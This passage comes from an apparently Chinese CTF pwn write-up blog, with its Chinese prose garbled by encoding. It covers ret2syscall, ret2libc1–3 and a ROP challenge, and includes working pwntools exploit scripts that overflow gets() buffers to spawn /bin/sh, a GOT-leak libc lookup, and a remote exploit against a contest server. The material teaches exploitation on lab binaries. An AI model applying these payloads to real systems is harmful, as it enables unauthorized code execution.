class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~$</span><span class="bash"> checksec --file=ret2libc1</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols     No       0               1       ret2libc1<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> file ret2libc1</span><br>ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped<br></code></pre></td></tr></table></figure><p>æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºgetså‡½æ•°çš„å­˜åœ¨ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p><p>æ‰¾ä¸€ä¸‹shå­—ç¬¦ä¸²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> ROPgadget --binary ret2libc1 --string <span class="hljs-string">&quot;/bin/sh&quot;</span></span><br>Strings information<br>============================================================<br>0x08048720 : /bin/sh<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°systemå‡½æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">.plt:08048460 ; int system(const char *command)<br>.plt:08048460 _system         proc near<br></code></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python<br>from pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>ç”±äºretï¼ˆä¹Ÿå³æ˜¯pop eipï¼‰çš„å­˜åœ¨ï¼Œsystemå‡½æ•°ä¸Šé¢+8åœ°å€å¤„æ‰æ˜¯çœŸæ­£çš„systemå‡½æ•°çš„å‚æ•°ï¼Œå› æ­¤+4åœ°å€å¤„éœ€è¦4å­—èŠ‚çš„å¡«å……</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303222128090.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2libc2</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols     No       0               2       ret2libc2<br><span class="hljs-meta"></span><br><span class="hljs-meta">~&gt;</span><span class="bash"> file ret2libc2</span><br>ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰systemå‡½æ•°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_system</span>.plt<span class="hljs-number">08048490</span><span class="hljs-number">00000006</span><span class="hljs-number">00000000</span><span class="hljs-number">00000004</span>R.....T.<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é“é¢˜æ²¡æœ‰ç°æˆçš„/bin/shå­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠ/bin/shå†™åˆ°.bssæ®µé‡Œé¢ã€‚çœ‹ä¸€ä¸‹.bssæ®µ</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.bss:0804A080 ; char buf2[100]</span><br><span class="hljs-title">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="hljs-title">.bss:0804A080 _bss            ends</span><br><span class="hljs-title">.bss:0804A080</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æŠŠè¿”å›åœ°å€å†™æˆgetså‡½æ•°ï¼Œæ‰‹åŠ¨è¾“å…¥/bin/shå­—ç¬¦ä¸²ï¼Œè¾¾åˆ°å°†/bin/shå†™å…¥åˆ°.bssæ®µçš„ç›®çš„ï¼Œä¹‹åè§¦å‘system(/bin/sh)å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br><span class="hljs-comment">#idaå¾—åˆ°åœ°å€</span><br>gets_plt=<span class="hljs-number">0x08048460</span><br>binsh_addr = <span class="hljs-number">0x0804A080</span><br>system_plt = <span class="hljs-number">0x08048490</span><br><br><span class="hljs-comment">#gdbè°ƒä¸€ä¸‹å¾—åˆ°112åç§»</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt,system_plt,binsh_addr,binsh_addr])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303222348210.png"></p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./ret2libc3</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/ret2libc3&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><h2 id="gotã€pltã€é“¾æ¥"><a href="#gotã€pltã€é“¾æ¥" class="headerlink" title="gotã€pltã€é“¾æ¥"></a>gotã€pltã€é“¾æ¥</h2><p>è¿™é‡Œéœ€è¦è¡¥å……å…³äºé“¾æ¥çš„çŸ¥è¯†</p><p>åŠ¨æ€é“¾æ¥çš„ç¨‹åºï¼Œä¸ä¼šå†åœ¨ç¼–è¯‘æ—¶å¾—åˆ°printfçš„åœ°å€ã€‚åŸå› å¾ˆç®€å•ï¼Œlibcæœ‰å¯èƒ½å‡çº§æˆ–è€…æ”¹å˜ç‰ˆæœ¬ç‰ˆæœ¬ï¼ˆæ¯”å¦‚æ¢äº†åˆ«çš„ä¸»æœºè¿è¡Œä¸åŒçš„libcç‰ˆæœ¬ï¼‰ï¼Œå› æ­¤ä¸èƒ½ç¡¬ç¼–ç åº“å‡½æ•°åœ°å€ï¼›æ­¤å¤–ï¼Œç”±äº ASLR çš„ç°ä»£ç³»ç»Ÿåœ¨æ¯æ¬¡ç¨‹åºè°ƒç”¨çš„ä¸åŒä½ç½®åŠ è½½åº“ï¼Œç¡¬ç¼–ç ä¹Ÿæ˜¯ä¸å¯ä»¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨lddå‘½ä»¤æŸ¥çœ‹åŠ¨æ€é“¾æ¥çš„ç¨‹åºçš„libcçš„åœ°å€ï¼Œldd å‘½ä»¤æ¨¡æ‹ŸåŠ è½½å¯æ‰§è¡Œç¨‹åºéœ€è¦çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä½†å¹¶ä¸æ‰§è¡Œç¨‹åºï¼Œåé¢çš„åœ°å€éƒ¨åˆ†è¡¨ç¤ºæ¨¡æ‹Ÿè£…è½½è¿‡ç¨‹ä¸­åŠ¨æ€é“¾æ¥åº“çš„åœ°å€ã€‚å¦‚æœå°è¯•å¤šæ¬¡è¿è¡Œ ldd å‘½ä»¤ï¼Œæˆ‘ä»¬ä¼šå‘ç°æ¯æ¬¡åŠ¨æ€é“¾æ¥åº“çš„åœ°å€éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› ä¸ºè¿™ä¸ªåœ°å€æ˜¯åŠ¨æ€å®šä½çš„</p><p>Linuxçš„ç­–ç•¥æ˜¯ï¼Œå…è®¸åœ¨ç¨‹åºè¿è¡Œæ—¶æŸ¥æ‰¾æ‰€æœ‰è¿™äº›åœ°å€ï¼Œå¹¶æä¾›ä¸€ç§ä»åº“è°ƒç”¨è¿™äº›å‡½æ•°çš„æœºåˆ¶ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„é‡å®šä½ï¼Œè¿™ä¸ªè¿‡ç¨‹ç”±é“¾æ¥å™¨å®Œæˆ</p><p>ä¸‹é¢æ˜¯é“¾æ¥æœŸé—´æœ‰å…³çš„æ®µï¼Œåœ¨idaä¸­å¯ä»¥ä½¿ç”¨shift+f7æŸ¥æ‰¾æ®µçš„åœ°å€</p><table><thead><tr><th>æ®µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>.plt</strong>ï¼ˆ<code>Procedure Linkage Table</code>)</td><td>è¿‡ç¨‹é“¾æ¥è¡¨</td></tr><tr><td><strong>.got</strong>ï¼ˆ<code>Global Offset Table</code>ï¼‰</td><td>å…¨å±€åç§»è¡¨ï¼Œé“¾æ¥å™¨ä¸ºå¤–éƒ¨ç¬¦å·å¡«å……çš„å®é™…åç§»è¡¨</td></tr><tr><td><strong>.got.plt</strong></td><td>å±äºgotè¡¨</td></tr><tr><td><strong>.plt.got</strong></td><td>åªæ˜¯ä¸ºäº†å¯¹ç§°ï¼Œæ— æ„ä¹‰</td></tr></tbody></table><p>routineï¼š</p><ul><li>1.è°ƒç”¨libcå‡½æ•°ï¼Œæ¯”å¦‚getså‡½æ•°ï¼Œ<code>call _puts</code></li><li>2.è¿›å…¥pltè¡¨ï¼Œjmpåˆ°gotè¡¨ï¼Œç”±äºæ‡’åŠ è½½æœºåˆ¶ï¼Œç¬¬ä¸€æ¬¡ä¸ä¼šå¾—åˆ°çœŸå®åœ°å€ï¼Œè€Œæ˜¯è¿›å…¥åˆ°gotè¡¨ä¹‹åé‡æ–°å›åˆ°pltè¡¨ï¼Œå¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡é‚£ä¹ˆä¼šç›´æ¥è·³è½¬åˆ°å·²ç»è§£æçš„åœ°å€å¤„</li><li>3.push func_idã€jmp commonè¿›å…¥å…¬å…±pltï¼Œå†æ¬¡è¿›å…¥gotè¡¨</li><li>4.è·³è½¬åˆ°_dl_runtime_resolveå‡½æ•°ï¼Œè¿›è¡Œåœ°å€è§£æã€é‡å®šä½</li><li>5.å°†çœŸå®åœ°å€å†™å…¥gotè¡¨</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">08048672</span>                 call    _puts<br><br><span class="hljs-meta"># puts@plt </span><br>    <br>.plt:<span class="hljs-number">08048460</span>                 jmp     ds:off_804A018 # è¿™ä¸ªåœ°å€ç¬¬ä¸€æ¬¡ä¸ä¼šè¢«è§£æ<br>.plt:<span class="hljs-number">08048460</span> _puts           endp<br>.plt:<span class="hljs-number">08048460</span><br>.plt:<span class="hljs-number">08048466</span> ; ---------------------------------------------------------------------------<br>.plt:<span class="hljs-number">08048466</span>                 push    <span class="hljs-number">18</span>h<br>.plt:<span class="hljs-number">0804846B</span>                 jmp     sub_8048420<br>    <br># sub_8048420    <br><br>.plt:<span class="hljs-number">08048420</span>                 push    ds:dword_804A004<br>.plt:<span class="hljs-number">08048426</span>                 jmp     ds:dword_804A008<br>    <br>.got.plt:<span class="hljs-number">0804</span>A004 dword_804A004   dd <span class="hljs-number">0</span>                    ; DATA XREF: sub_8048420â†‘r<br>.got.plt:<span class="hljs-number">0804</span>A008 dword_804A008   dd <span class="hljs-number">0</span>                    ; DATA XREF: sub_8048420+<span class="hljs-number">6</span>â†‘r<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303251612518.png"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¸ä¸Šé“é¢˜ä¸åŒçš„æ˜¯ï¼Œè¿™é“é¢˜æ²¡æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰/bin/shå­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¾—åˆ°libcçš„åœ°å€ï¼Œå¹¶åœ¨libcä¸­æ‰¾åˆ°systemå’Œshå­—ç¬¦ä¸²</p><p>åˆ†æï¼š</p><ul><li>åˆ©ç”¨gotè¡¨æ³„éœ²ï¼Œå¾—åˆ°putså‡½æ•°çš„åœ°å€</li><li>ç”±äºlibcå†…çš„å‡½æ•°æœ€ä½12ä½ä¸éšç€libcåº“ç‰ˆæœ¬çš„æ”¹å˜è€Œæ”¹å˜ï¼Œå› æ­¤åªè¦å¾—åˆ°putså‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°libcçš„ç‰ˆæœ¬</li><li>ç”±äºlibcå†…çš„å‡½æ•°çš„ç›¸å¯¹åç§»ä¸éšç€libcåº“ç‰ˆæœ¬çš„æ”¹å˜è€Œæ”¹å˜ï¼Œå› æ­¤åªè¦å¾—åˆ°putså‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°å…¶ä½™å‡½æ•°çš„åœ°å€ï¼ˆæ¯”å¦‚systemå‡½æ•°ã€shå­—ç¬¦ä¸²ï¼‰</li></ul><p>åˆ©ç”¨<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a>ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è¾¾åˆ°ç›®çš„</p><p>ç¨‹åºå¼€å§‹æ‰§è¡Œï¼Œåœ¨é‡åˆ°getså‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹è¿”å›åœ°å€ä½¿å¾—å¯ä»¥è¿”å›åˆ°mainå‡½æ•°ï¼ŒåŒæ—¶è°ƒç”¨putså‡½æ•°ï¼Œä¸”å°†puts_gotçš„å€¼è¾“å‡ºï¼Œä»è€Œå¾—åˆ°libcç‰ˆæœ¬</p><p>åœ¨å¾—åˆ°puts_gotä¹‹åï¼Œè¿”å›åˆ°mainæ‰§è¡Œï¼Œè¿™æ—¶å€™ä¼šå†æ¬¡å›åˆ°getså‡½æ•°çš„æ‰€åœ¨ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦è§‚å¯Ÿæ ˆå¸§ï¼Œå¾—åˆ°é€ æˆç¼“å†²åŒºæº¢å‡ºçš„åç§»</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303252330297.png"></p><p>ç¬¬ä¸€æ¬¡çš„åç§»å¥½ç®—ï¼Œç›´æ¥gdbåˆ°getsçš„è°ƒç”¨å³å¯ï¼Œä¸º112ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä½¿ç”¨pwntoolsçš„åŒæ—¶è¿›è¡Œgdbè°ƒè¯•ã€‚æ³¨æ„è°ƒè¯•çš„æ—¶å€™åœ¨pyæ–‡ä»¶ä¸­gdb.attach(sh)çš„ä½ç½®è¦æ”¾å¯¹</p><p>å¯ä»¥çœ‹åˆ°ä¸‹é¢ç¬¬äºŒæ¬¡è°ƒç”¨getså‡½æ•°æ—¶çš„å †æ ˆå€¼</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303252330868.png"></p><p>è¿™é‡Œé‡åˆ°äº†æŠ¥é”™ï¼šLibcSearcheræ‰¾ä¸åˆ°åˆé€‚libcï¼Œéœ€è¦æ›´æ–°ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd LibcSearcher<br>rm -rf libc-database/ # åˆ æ‰æ—§çš„<br>git clone https://github.com/niklasb/libc-database<br>cd libc-database<br>./get # è·å–æ–°çš„<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°å¦‚æœæƒ³åœ¨pwntoolsä¸­ä½¿ç”¨tmuxçš„è¯ï¼Œéœ€è¦å…ˆåœ¨å‘½ä»¤è¡Œè¾“å…¥tmuxï¼Œç­‰è¿›å…¥tmuxä¸­å†è¾“å…¥payload.py</p><p>ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment"># 0xffffd308-0xffffd280-0x1c+4=112</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">112</span>) + p32(puts_plt) + p32(main) + p32(puts_got)<br><br>gdb.attach(sh) <br><br>sh.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br><br>puts_addr = u32(sh.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment"># Â get puts addr</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr) <span class="hljs-comment"># Â search libc</span><br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment"># Â get libc base</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment"># Â get system addr</span><br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment"># Â get /bin/sh addr</span><br><br><span class="hljs-comment">#gdb.attach(sh)</span><br><span class="hljs-comment">#104 is offset and is hard to get </span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">104</span>) + p32(system_addr) + p32(<span class="hljs-number">0xaaaa</span>) + p32(binsh_addr)<br>sh.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./rop&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;124.16.75.116&#x27;</span>,<span class="hljs-number">52017</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>bss=<span class="hljs-number">0x404130</span><br>puts_plt=<span class="hljs-number">0x4010d0</span><br>read_plt=<span class="hljs-number">0x401100</span> <span class="hljs-comment">#elf.plt[&#x27;read&#x27;]</span><br>sys_open=<span class="hljs-number">0x4012c9</span><br><span class="hljs-comment">#ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br><span class="hljs-comment">#0x0000000000401503 : pop rdi ; ret</span><br><span class="hljs-comment">#0x0000000000401501 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-comment">#0x000000000040101a : ret</span><br><span class="hljs-comment">#flag</span><br><br><span class="hljs-comment">#flag&#123;8ac4f835-a613-46ff-8c86-4c2428c24982&#125;</span><br>pop_rdi=<span class="hljs-number">0x0000000000401503</span><br>pop_rsi=<span class="hljs-number">0x0000000000401501</span><br>vul=<span class="hljs-number">0x401384</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;your choice:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;4919&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span 